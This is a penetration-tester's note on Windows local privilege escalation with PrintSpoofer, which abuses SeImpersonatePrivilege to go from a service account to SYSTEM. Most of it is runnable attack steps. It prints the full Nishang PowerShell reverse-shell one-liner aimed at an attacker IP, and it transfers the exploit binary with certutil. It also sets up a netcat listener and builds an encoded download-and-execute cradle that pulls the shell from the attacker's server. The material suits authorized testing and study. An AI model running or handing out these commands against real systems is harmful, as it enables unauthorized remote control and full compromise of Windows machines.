---
Primary_category: "[[PRINT SPOOLER SERVICE]]"
title: "PRINTSPOOFER"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[PRINT SPOOLER SERVICE]]

#### *Theory*

This technique can be leveraged to achieve *Privilege Escalation* from *LOCAL SERVICE* or *NETWORK SERVICE* to *SYSTEM* when the ***SeImpersonatePrivilege*** is enabled in *Access Token* of the current *Logon Session*

---

#### *Abusing for LPE - Windows*

##### *Getting the Reverse Shell Script*

> ***[Nishang Reverse Shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)***

###### *Downloading the Code Snippet*

```bash
curl --silent --location --request GET "https://github.com/samratashok/nishang/raw/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1" --output rev.ps1
```

###### *Editing as follows*

> [!DANGER]- *Code Snippet*
>
> ```powershell
> $client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<LISTENING_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ``` 
>

##### *Downloading and Transferring the PrintSpoofer Binary to the Target*

###### *Downloading the Binary*

> ***[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)***

```bash
curl --silent --location --request GET "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" --output printspooferx64.exe
```

###### *Transferring the Binary to the Target*

- ***From the Attacker*** ⚔️ 

```bash
python3 -m http.server <PORT>
```

- ***From the Target*** 🎯 

```bash
mkdir C:\Windows\Temp\PE
cd C:\Windows\Temp\PE
```

```bash
certutil.exe -urlcache -split -f http://<ATTACKER>:<PORT>/printspooferx64.exe
```

##### *Setting up an HTTP Server*

```bash
python3 -m http.server 8080
```

##### *Setting up a Netcat Listener for the Rev. Shell*

> ***[Netcat](https://linux.die.net/man/1/nc)***

```bash
nc -nlvp <LISTENING_PORT>
```

##### *Command Encoding*

> ***From the Attacker***⚔️ 

```bash
echo -n "IEX (New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>:<PORT>/rev.ps1')" | iconv --from-code UTF-8 --to-code UTF-16LE | base64 -w 0 ; echo
```

##### *Running the Exploit*

> ***From the Target*** 🎯

```bash
.\printspooferx64.exe -c 'powershell.exe -EncodedCommand <BASE64_STRING>'
```

---

#### *References*

***[PrintSpoofer - Abusing Impersonation Privilege on Windows 10 and WS 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)***